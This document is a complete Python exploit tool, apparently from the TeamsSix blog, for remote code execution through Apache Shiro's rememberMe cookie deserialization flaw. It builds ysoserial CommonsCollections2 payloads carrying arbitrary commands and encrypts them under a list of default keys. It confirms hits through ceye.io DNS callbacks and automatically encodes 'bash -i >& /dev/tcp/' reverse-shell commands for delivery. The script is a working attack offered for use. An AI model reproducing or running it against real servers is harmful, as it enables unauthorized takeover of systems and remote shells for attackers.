# By TeamsSix
# Blog: www.teamssix.com
import sys
import json
import time
import uuid
import base64
import getopt
import requests
import subprocess
from random import Random
from Crypto.Cipher import AES


def cat_help():
	print('''\33[0;34m
   _____ __    _               ________              __      ____  ____________
  / ___// /_  (_)________     / ____/ /_  ___  _____/ /__   / __ \/ ____/ ____/
  \__ \/ __ \/ / ___/ __ \   / /   / __ \/ _ \/ ___/ //_/  / /_/ / /   / __/   
 ___/ / / / / / /  / /_/ /  / /___/ / / /  __/ /__/ ,<    / _, _/ /___/ /___   
/____/_/ /_/_/_/   \____/   \____/_/ /_/\___/\___/_/|_|  /_/ |_|\____/_____/   By TeamsSix

我的个人博客：teamssix.com
我的个人公众号：TeamsSix

-c ：输入要执行的命令
-h ：查看帮助
-k : 输入自定义的key，不输入此参数时将遍历尝试默认key
-t ：输入你的ceye.io的token，用于检测shiro漏洞是否存在，此选项需要配合 -c "ping your.ceye.io" 使用
-u ：指定URL

python3 shiro-check-rce.py (-c) <command> [-h] [-k] <key> [-t] <token> (-u) <url>\033[0m
			''')


def encode_rememberme(key, command):
	popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	mode = AES.MODE_CBC
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	file_body = pad(popen.stdout.read())
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	return base64_ciphertext


def check_key(command, url, token):
	r_ceye = requests.get('http://api.ceye.io/v1/records?token={}&type=dns'.format(token))
	dns_query_naumber1 = len(json.loads(r_ceye.text)['data'])
	f = open('keys.txt', 'r')
	keys = f.readlines()
	for i in keys:
		i = i.replace('\n', '')
		print('[{}] 尝试Key：{}'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), i))
		payload = encode_rememberme(i, command)
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
			'Cookie': 'rememberMe={}'.format(payload.decode())
		}
		r_target = requests.get(url, headers=headers, verify=False, timeout=7)
		time.sleep(3)
		r_ceye = requests.get('http://api.ceye.io/v1/records?token={}&type=dns'.format(token))
		dns_query_naumber2 = len(json.loads(r_ceye.text)['data'])
		if dns_query_naumber2 > dns_query_naumber1:
			print('\33[0;31m\n[{}] shiro反序列化漏洞存在，Key为：{}\n\033[0m'.format(
				time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), i))
			sys.exit()
	print('[{}] 默认Key已检测完成，未发现 shiro 漏洞'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))


def check_key_appoint(command, url, key, token):
	r_ceye = requests.get('http://api.ceye.io/v1/records?token={}&type=dns'.format(token))
	dns_query_naumber1 = len(json.loads(r_ceye.text)['data'])
	print('[{}] 尝试Key：{}\n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), key))
	payload = encode_rememberme(key, command)
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
		'Cookie': 'rememberMe={}'.format(payload.decode())
	}
	r_target = requests.get(url, headers=headers, verify=False, timeout=7)
	time.sleep(3)
	r_ceye = requests.get('http://api.ceye.io/v1/records?token={}&type=dns'.format(token))
	dns_query_naumber2 = len(json.loads(r_ceye.text)['data'])
	if dns_query_naumber2 > dns_query_naumber1:
		print('\33[0;31m[{}] shiro反序列化漏洞存在，Key为：{}\n\033[0m'.format(
			time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), key))
		sys.exit()
	print('\33[0;33m[{}] Key: {} 已检测完成，未发现 shiro 漏洞\n\033[0m'.format(
		time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), key))


def exp_key_appoint(command, url, key):
	if 'bash -i >& /dev/tcp/' in command:
		command_base64 = str(base64.b64encode(command.encode('utf-8')), 'utf-8')
		command = 'bash -c {echo,' + command_base64 + '}|{base64,-d}|{bash,-i}'
		print(
			'\33[0;33m[{}] 检测到command中存在bash反弹shell命令，已对传入命令进行编码，编码后结果为：{}\n\033[0m'.format(
				time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), command))
	print('[{}] 尝试Key：{}\n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), key))
	payload = encode_rememberme(key, command)
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
		'Cookie': 'rememberMe={}'.format(payload.decode())
	}
	r_target = requests.get(url, headers=headers, verify=False, timeout=7)


def exp_appoint(command, url):
	if 'bash -i >& /dev/tcp/' in command:
		command_base64 = str(base64.b64encode(command.encode('utf-8')), 'utf-8')
		command = 'bash -c {echo,' + command_base64 + '}|{base64,-d}|{bash,-i}'
		print(
			'\33[0;33m[{}] 检测到command中存在bash反弹shell命令，已对传入命令进行编码，编码后结果为：{}\n\033[0m'.format(
				time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), command))
	f = open('keys.txt', 'r')
	keys = f.readlines()
	for i in keys:
		i = i.replace('\n', '')
		print('[{}] 尝试Key：{}'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), i))
		payload = encode_rememberme(i, command)
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
			'Cookie': 'rememberMe={}'.format(payload.decode())
		}
		r_target = requests.get(url, headers=headers, verify=False, timeout=7)


if __name__ == '__main__':
	try:
		requests.packages.urllib3.disable_warnings()
		try:
			opts, args = getopt.getopt(sys.argv[1:], "c:hk:t:u:")
		except getopt.GetoptError:
			cat_help()
			print(
				'\33[0;31m[{}] 告警提示：必须指定 -c 和 -u 参数\n\033[0m'.format(
					time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
			sys.exit()
		for opt, arg in opts:
			if opt == '-h':
				cat_help()
				sys.exit()
			elif opt in ("-c"):
				command = arg
			elif opt in ("-k"):
				key = arg
			elif opt in ("-t"):
				token = arg
			elif opt in ("-u"):
				url = arg
		if 'command' in globals() and 'url' in globals():
			if 'token' in globals() and 'key' not in globals():
				cat_help()
				print(
					'\33[0;33m[{}] 告警提示：如果你想验证目标是否存在shiro反序列化漏洞，则需要 -t your_ceye_token 和 -c "ping your.ceye.io" 配合使用\n\033[0m'.format(
						time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
				check_key(command, url, token)
			elif 'token' in globals() and 'key' in globals():
				cat_help()
				print(
					'\33[0;33m[{}] 告警提示：如果你想验证目标是否存在shiro反序列化漏洞，则需要 -t your_ceye_token 和 -c "ping your.ceye.io" 配合使用\n\033[0m'.format(
						time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
				check_key_appoint(command, url, key, token)
			elif 'token' not in globals() and 'key' in globals():
				cat_help()
				exp_key_appoint(command, url, key)
			else:
				cat_help()
				exp_appoint(command, url)
		else:
			cat_help()
			print(
				'\33[0;31m[{}] 错误提示：必须指定 -c 和 -u 参数\n\033[0m'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
	except KeyboardInterrupt:
		print(
			'\33[0;33m\n[{}] 检测到中断操作，程序正在退出……\n\033[0m'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
